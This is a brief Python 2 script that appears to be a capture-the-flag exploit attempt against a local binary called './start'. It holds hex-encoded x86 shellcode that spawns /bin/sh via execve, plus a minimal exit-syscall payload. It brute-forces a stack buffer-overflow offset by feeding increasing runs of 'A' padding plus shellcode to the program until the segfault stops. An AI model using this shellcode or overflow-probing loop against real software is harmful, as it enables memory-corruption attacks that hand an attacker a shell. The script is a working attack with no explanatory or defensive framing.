#!/usr/bin/python
import subprocess

exploit = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
exploit1 = "\x31\xdb\xb0\x01\xcd\x80"
for i in range(20,1000):
    payload = "A" * i
    # result = subprocess.run(['./start'], stdout=subprocess.PIPE, input=payload + exploit, encoding='UTF-8')
    # print (result.stdout)
    # print (result.returncode)
    # if result.returncode != -11:
    #    break
    proc = subprocess.Popen('./start', stdin=subprocess.PIPE)
    proc.communicate(payload + exploit1)
    if proc.returncode == -11:
        continue
    else:
        print i
        print proc.returncode
        break
